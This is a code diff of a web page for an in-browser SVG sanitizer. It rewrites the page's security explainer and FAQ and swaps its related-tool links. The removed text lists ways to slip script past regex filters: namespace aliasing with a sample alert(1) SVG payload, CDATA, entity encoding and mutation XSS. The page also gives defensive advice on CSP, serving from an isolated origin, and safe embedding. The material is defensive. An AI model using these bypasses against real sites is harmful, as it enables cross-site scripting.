-          <strong>Namespace Evasion:</strong> XML allows arbitrary namespace aliasing. An attacker can declare <code>&lt;svg xmlns:evil="http://www.w3.org/2000/svg"&gt;&lt;evil:script&gt;alert(1)&lt;/evil:script&gt;&lt;/svg&gt;</code>. A regex scanning for <code>&lt;script</code> will fail to detect the tag, but any XML-compliant browser will execute it effortlessly.
-        </li>
-        <li>
-          <strong>CDATA Encapsulation:</strong> By placing malicious payloads within <code>&lt;![CDATA[ ... ]]&gt;</code> sections or utilizing XML comments to break token identification, attackers break regex tokenizers without disturbing the XML DOM parser.
-        </li>
-        <li>
-          <strong>Character Entity Encoding:</strong> Attributes in XML can be represented using decimal, hexadecimal, or named HTML/XML entities (e.g., <code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;...</code> for <code>javascript:</code>). Regex filters that do not decode entities recursively will miss the executable URI.
-        </li>
-        <li>
-          <strong>Mutation XSS (mXSS):</strong> When an SVG is written to the DOM via <code>innerHTML</code>, the browser's HTML parser re-interprets the markup, resolving ambiguous nestings and re-serializing elements. Markup that appeared benign to a regex filter can mutate into an executable script block upon DOM ingestion.
-        </li>
-      </ul>
-      <blockquote>
-        <strong>Engineering Principle:</strong> Security sanitization must always occur within the native DOM parser of the target environment. Only structural tree-walking algorithms can guarantee that what is inspected matches what will be rendered.
-      </blockquote>
-
-      <h2>Technical Comparison Table: SVG Sanitization Techniques</h2>
-      <p>
-        Understanding the operational trade-offs between different sanitization methodologies is essential for systems architecture:
-      </p>
-      <div class="tech-table-wrapper">
-        <table class="tech-table">
-          <thead>
-            <tr>
-              <th>Methodology</th>
-              <th>Execution Environment</th>
-              <th>XSS Protection</th>
-              <th>Visual Fidelity</th>
-              <th>Overhead & Privacy</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td><strong>BitDark DOMParser (Client-Side)</strong></td>
-              <td>Local Browser RAM (DOMParser)</td>
-              <td><strong>High (Strict Node Whitelist)</strong></td>
-              <td><strong>Lossless Vector</strong> (Exact XML preservation)</td>
-              <td>Instantaneous; <strong>Zero network egress / 100% private</strong></td>
-            </tr>
-            <tr>
-              <td><strong>DOMPurify (JavaScript Library)</strong></td>
-              <td>Client or Node.js Runtime</td>
-              <td><strong>Very High</strong> (Industry gold standard)</td>
-              <td><strong>Lossless Vector</strong></td>
-              <td>Fast; requires NPM dependency management</td>
-            </tr>
-            <tr>
-              <td><strong>Raster Conversion (Batik / Cairo / ImageMagick)</strong></td>
-              <td>Server-Side Worker Processes</td>
-              <td><strong>Absolute</strong> (Converts XML to raster PNG)</td>
-              <td><strong>Lossy</strong> (Destroys infinite scalability & CSS styling)</td>
-              <td>Very High; susceptible to server-side RCE / memory exhaustion</td>
-            </tr>
-            <tr>
-              <td><strong>Regex String Scrubbing</strong></td>
-              <td>Ad-hoc Application Code</td>
-              <td><strong>Dangerously Ineffective (Trivial Bypasses)</strong></td>
-              <td>Unpredictable (Often breaks valid complex SVGs)</td>
-              <td>Minimal overhead; high vulnerability liability</td>
-            </tr>
-            <tr>
-              <td><strong>Browser <code>&lt;img&gt;</code> Sandboxing</strong></td>
-              <td>Client Rendering Engine</td>
-              <td><strong>High</strong> (Scripts blocked in image mode)</td>
-              <td><strong>Lossless Vector</strong></td>
-              <td>Only protects if users cannot directly open the raw asset</td>
-            </tr>
-          </tbody>
-        </table>
-      </div>
-
-      <h2>Best Practices for Secure SVG Handling & Ingestion Pipelines</h2>
-      <p>
-        To achieve enterprise-grade resilience against vector vulnerabilities, implement defense-in-depth across your application infrastructure:
-      </p>
-
-      <h3>1. Serve SVGs with Explicit Content-Disposition Headers</h3>
-      <p>
-        If your platform hosts user-uploaded SVG files, configure your object storage (AWS S3, Google Cloud Storage, Cloudflare R2) to serve user assets with:
-      </p>
-      <pre><code>Content-Disposition: attachment; filename="vector.svg"
-Content-Type: image/svg+xml</code></pre>
-      <p>
-        The <code>attachment</code> directive forces the client browser to download the file to the user's hard drive rather than rendering it inline inside a browser tab, completely neutralizing inline script detonation.
-      </p>
-
-      <h3>2. Isolate User-Generated Vectors on an Untrusted Subdomain</h3>
-      <p>
-        Never serve user-uploaded SVGs from your primary authentication domain (e.g., <code>app.company.com</code>). Host all static assets on an isolated sandbox domain (e.g., <code>companyusercontent.com</code>) that maintains:
-      </p>
-      <ul>
-        <li>No access to session cookies (cookies scoped strictly to the application domain).</li>
-        <li>No access to <code>localStorage</code> or indexedDB secrets.</li>
-        <li>A distinct Origin context, ensuring that any residual script execution cannot issue authenticated requests to internal APIs.</li>
-      </ul>
-
-      <h3>3. Deploy a Strict Content Security Policy (CSP)</h3>
-      <p>
-        When vector assets must be rendered or served directly, enforce a restrictive Content Security Policy header on the asset response:
-      </p>
-      <pre><code>Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; sandbox</code></pre>
-      <p>
-        The <code>sandbox</code> directive disables script execution, popups, and top-level navigation, preventing even un-sanitized SVGs from executing JavaScript.
-      </p>
-
-      <h3>4. Restrict Embedding Techniques</h3>
-      <p>
-        Always prefer rendering SVGs using the standard HTML <code>&lt;img src="graphic.svg"&gt;</code> tag or as CSS background images (<code>background-image: url('graphic.svg')</code>). Never use <code>&lt;iframe&gt;</code>, <code>&lt;object&gt;</code>, or <code>&lt;embed&gt;</code> for untrusted files, and strictly avoid injecting raw SVG markup using <code>innerHTML</code> without prior DOMPurify or BitDark sanitization passes.
-      </p>
-
-      <h2>Common Mistakes and Operational Vulnerabilities</h2>
-      <p>
-        Security teams auditing SVG workflows frequently uncover several common engineering errors:
-      </p>
-      <ul>
-        <li>
-          <strong>Relying on File Extension Checks Alone:</strong> Verifying that a file ends with <code>.svg</code> provides zero security verification. An attacker can rename an HTML document containing weaponized JavaScript to <code>report.svg</code>; if served with an incorrect MIME type, browsers may execute it as HTML.
-        </li>
-        <li>
-          <strong>Trusting Image Magic Bytes:</strong> Raster formats have distinct binary signatures (e.g., <code>0x89 0x50 0x4E 0x47</code> for PNG). SVGs, being XML, have no fixed magic bytes—they can begin with XML declarations, whitespace, comments, or DOCTYPEs, making simple byte sniffing unreliable.
-        </li>
-        <li>
-          <strong>Forgetting About SMIL and CSS URL Expressions:</strong> Removing <code>&lt;script&gt;</code> tags while leaving <code>style="background: url('javascript:...')"</code> or active SMIL animation attributes leaves the vector wide open to interaction-based XSS.
-        </li>
-        <li>
-          <strong>Allowing Unsanitized Namespaces:</strong> Stripping known SVG tags but failing to monitor namespace declarations allows attackers to re-introduce HTML through XHTML or MathML namespaces.
-        </li>
+        <li><strong>Denylist, not allowlist:</strong> it removes known-bad constructs. A maintained allowlist sanitizer like DOMPurify, which keeps only known-safe markup, is the stronger choice for production use.</li>
+        <li><strong>mXSS and engine quirks:</strong> browsers parse edge-case markup differently, and mutation-XSS can turn seemingly safe markup dangerous on insertion. Cleaning is one layer, not the whole defence.</li>
+        <li><strong>Prefer safe embedding:</strong> render untrusted SVGs with <code>&lt;img&gt;</code> or as a CSS background rather than inlining them, add a strict CSP, and serve them from an isolated origin.</li>
       </ul>
 
       <!-- Interactive FAQ Section -->
       <section class="faq-block">
-        <h2>Frequently Asked Technical Questions</h2>
+        <h2>Frequently Asked Questions</h2>
 
         <div class="faq-item">
-          <div class="faq-question">Why does the BitDark SVG Sanitizer strip the &lt;style&gt; element?</div>
+          <div class="faq-question">Why can an SVG run JavaScript when a PNG or JPEG cannot?</div>
           <div class="faq-answer">
-            While basic CSS inside <code>&lt;style&gt;</code> is often benign, style blocks represent a significant attack surface in SVG. Attackers can embed CSS expressions (such as legacy Internet Explorer <code>expression()</code> hooks), remote resource imports via <code>@import</code>, or <code>url()</code> schemes referencing executable vectors. To maintain absolute security guarantees, the BitDark engine purges embedded <code>&lt;style&gt;</code> blocks while preserving harmless presentation attributes (such as <code>fill</code>, <code>stroke</code>, and <code>stroke-width</code>) directly on geometric elements.
+            A PNG or JPEG is just compressed pixels. An SVG is an XML document that the browser parses like a small web page: it can contain a <code>script</code> element, <code>on*</code> event handlers, links, embedded HTML via <code>foreignObject</code>, and SMIL animation. Rendered in an active context, that markup can run JavaScript, which is why an untrusted SVG needs cleaning or careful embedding.
           </div>
         </div>
 
         <div class="faq-item">
-          <div class="faq-question">Can an SVG execute JavaScript when embedded as a CSS background-image?</div>
+          <div class="faq-question">Does loading an SVG with an HTML img tag make it safe?</div>
           <div class="faq-answer">
-            No. When an SVG is loaded via CSS (e.g., <code>background-image: url('vector.svg')</code>), modern browsers treat the file in the exact same restricted "image mode" as an HTML <code>&lt;img&gt;</code> tag. In this mode, external HTTP requests, scripts, and interactive event handlers are deactivated.
+            Largely, yes. Browsers render an SVG loaded through an <code>&lt;img&gt;</code> tag in a restricted mode where scripts and external loads do not run, which is also how this tool previews the cleaned file. The danger is the other ways an SVG is used: opened directly, embedded via <code>&lt;iframe&gt;</code>, <code>&lt;object&gt;</code> or <code>&lt;embed&gt;</code>, or inlined into a page with <code>innerHTML</code> &mdash; there its scripts can run. Sanitizing matters most when the SVG will be inlined.
           </div>
         </div>
 
         <div class="faq-item">
-          <div class="faq-question">What is a Billion Laughs attack and how does this tool prevent it?</div>
+          <div class="faq-question">What exactly does this tool remove?</div>
           <div class="faq-answer">
-            A Billion Laughs attack is an XML entity expansion exploit where nested entity references multiply exponentially (e.g., 10 references to an entity containing 10 references to another). When parsed, a 1-kilobyte SVG can consume over 3 gigabytes of memory, causing instant browser tab crashes or server-side denial of service. BitDark strips all <code>&lt;!DOCTYPE&gt;</code> and <code>&lt;!ENTITY&gt;</code> definitions from the text stream prior to DOM ingestion, completely defusing the exploit.
+            It strips <code>DOCTYPE</code> and <code>ENTITY</code> declarations from the text, then parses the XML and removes known-dangerous elements (<code>script</code>, <code>foreignObject</code>, <code>iframe</code>, <code>object</code>, <code>embed</code>, <code>style</code>, form fields and others), every <code>on*</code> event-handler attribute, <code>javascript:</code>/<code>vbscript:</code>/<code>data:</code> URIs on <code>href</code>, <code>src</code> and SMIL animation values, and dangerous CSS in <code>style</code> attributes. Each removal is listed in the audit log.
           </div>
         </div>
 
         <div class="faq-item">
-          <div class="faq-question">Will sanitizing an SVG alter its visual appearance or resolution?</div>
+          <div class="faq-question">Is this as thorough as DOMPurify?</div>
           <div class="faq-answer">
-            Because SVG is a vector format based on mathematical coordinate geometry (paths, polygons, curves), removing non-graphical nodes (such as scripts, foreignObjects, and event listeners) leaves visual vector geometry 100% intact. Unless your SVG relied on JavaScript to dynamically generate visual geometry, the purified asset will render identically to the original.
+            Not necessarily. This tool uses a denylist &mdash; it removes things known to be dangerous &mdash; which is good for triage and for seeing what a file contains, but a denylist can miss a novel or obfuscated vector. For production, a maintained allowlist sanitizer such as DOMPurify (which keeps only known-safe markup) is the stronger choice. Use this tool to inspect and clean, and defence-in-depth (CSP, serving from an isolated origin) alongside it.
           </div>
         </div>
 
         <div class="faq-item">
-          <div class="faq-question">How does BitDark handle xlink:href vs modern href attributes?</div>
+          <div class="faq-question">Is my SVG uploaded anywhere?</div>
           <div class="faq-answer">
-            Legacy SVG specifications utilized the XLink namespace (<code>xlink:href</code>) for hyperlinking and referencing resources, whereas SVG 2 standardizes on the un-namespaced <code>href</code> attribute. The BitDark engine evaluates both standard attributes and namespaced attributes across the entire DOM tree, stripping any value that contains executable pseudo-protocols (such as <code>javascript:</code>, <code>vbscript:</code>, or executable <code>data:</code> URIs).
-          </div>
-        </div>
-
-        <div class="faq-item">
-          <div class="faq-question">Does this tool inspect SVG files embedded inside other formats?</div>
-          <div class="faq-answer">
-            This tool is designed specifically for standalone SVG documents. If an SVG is encapsulated inside a PDF or an Office document, it must first be extracted before running it through the BitDark sanitizer.
-          </div>
-        </div>
-
-        <div class="faq-item">
-          <div class="faq-question">Why does the preview container use an &lt;img&gt; tag with a Blob URL?</div>
-          <div class="faq-answer">
-            Rendering untrusted or freshly sanitized SVG code directly into the active web page via <code>innerHTML</code> carries residual risk if browser-specific parser quirks exist. By converting the sanitized SVG into an isolated <code>Blob</code> and rendering it via an HTML <code>&lt;img&gt;</code> tag, the browser strictly enforces image-mode isolation, guaranteeing that zero scripts can execute during preview.
-          </div>
-        </div>
-
-        <div class="faq-item">
-          <div class="faq-question">Does BitDark log or store my uploaded vectors?</div>
-          <div class="faq-answer">
-            Never. BitDark operates on an air-gapped zero-network-egress security model. All XML parsing, attribute scrubbing, SHA-256 digest calculation, and sanitized vector rendering occur locally within your browser's private WebAssembly and JavaScript memory space.
+            No. The file is read and parsed in your browser, the cleaning and the SHA-256 hash run there, and the preview is built from the cleaned file locally. Nothing you open is sent to a server; the page makes no network request for your file.
           </div>
         </div>
       </section>
 
       <!-- Internal SEO Linking Grid -->
       <section class="related-tools-section">
-        <h3>Related Forensic, Privacy & Security Utilities</h3>
+        <h3>Related Security &amp; Forensics Utilities</h3>
         <div class="related-grid">
+          <a href="/tools/auth/xss-escape/" class="related-card">
+            <div class="related-card-title"><span>[&#128737;&#65039;]</span> XSS Escaper</div>
+            <div class="related-card-desc">Escape text for safe insertion into HTML, attributes, JavaScript and URLs.</div>
+          </a>
+          <a href="/tools/encoding/html-entities/" class="related-card">
+            <div class="related-card-title"><span>[&amp;]</span> HTML Entity Encoder</div>
+            <div class="related-card-desc">Convert text to and from named, decimal and hexadecimal HTML entities.</div>
+          </a>
+          <a href="/tools/forensics/magic-bytes/" class="related-card">
+            <div class="related-card-title"><span>[&#128270;]</span> Magic Bytes Analyzer</div>
+            <div class="related-card-desc">Identify a file from its header bytes and catch extension spoofing, in your browser.</div>
+          </a>
           <a href="/tools/forensics/strings/" class="related-card">
-            <div class="related-card-title"><span>[🔍]</span> Binary Strings Extractor</div>
-            <div class="related-card-desc">Extract ASCII and UTF-16LE string payloads from binary files, images, and suspicious vector blobs.</div>
+            <div class="related-card-title"><span>[&#128269;]</span> Binary Strings Extractor</div>
+            <div class="related-card-desc">Pull readable ASCII and UTF-16LE strings out of a binary locally.</div>
           </a>
-          <a href="/tools/auth/csp-evaluator/" class="related-card">
-            <div class="related-card-title"><span>[🛡️]</span> CSP Policy Evaluator</div>
-            <div class="related-card-desc">Audit Content Security Policy directives to identify XSS bypasses and missing iframe sandbox defenses.</div>
+          <a href="/tools/encoding/url-codec/" class="related-card">
+            <div class="related-card-title"><span>[%]</span> URL Encoder &amp; Decoder</div>
+            <div class="related-card-desc">Percent-encode and decode URLs and query values, with a structure inspector.</div>
           </a>
-          <a href="/tools/auth/sri-generator/" class="related-card">
-            <div class="related-card-title"><span>[🔒]</span> Subresource Integrity (SRI)</div>
-            <div class="related-card-desc">Generate cryptographic SHA-384 and SHA-512 hashes for CDN scripts to guard against third-party tampering.</div>
-          </a>
-          <a href="/tools/privacy/steganography/" class="related-card">
-            <div class="related-card-title"><span>[🖼️]</span> Canvas Steganography</div>
-            <div class="related-card-desc">Conceal and recover covert text messages within image pixel Least Significant Bits entirely inside browser RAM.</div>
-          </a>
-          <a href="/tools/privacy/exif-stripper/" class="related-card">
-            <div class="related-card-title"><span>[📍]</span> EXIF & GPS Scrubber</div>
-            <div class="related-card-desc">Permanently remove geolocation coordinates, camera serial numbers, and device telemetry from photos.</div>
-          </a>
-          <a href="/tools/ai/c2pa-inspector/" class="related-card">
-            <div class="related-card-title"><span>[🔬]</span> C2PA Provenance Manifest Reader</div>
-            <div class="related-card-desc">Verify AI image origins, cryptographic manifests, and JUMBF assertion chains locally in your browser.</div>
+          <a href="/tools/crypto/multi-hash/" class="related-card">
+            <div class="related-card-title"><span>[#&#65039;&#8419;]</span> Multi-Hash Generator</div>
+            <div class="related-card-desc">Compute several file hashes at once, including SHA-256 and MD5, in local memory.</div>
           </a>
         </div>
       </section>
@@ -1323,7 +959,6 @@ Content-Type: image/svg+xml</code></pre>
     </div>
   </main>
 
-  <!-- Complete Standard Footer -->
   <footer class="footer">
     <div class="footer-inner">
       <div class="footer-left">
@@ -1342,7 +977,7 @@ Content-Type: image/svg+xml</code></pre>
     </div>
   </footer>
 
-  <script>
+    <script>
     // 1. Zero-CLS AdSense Auto-Reveal Observer
     function setupAdSlotObserver() {
       const adSlots = document.querySelectorAll('.ad-container-slot');
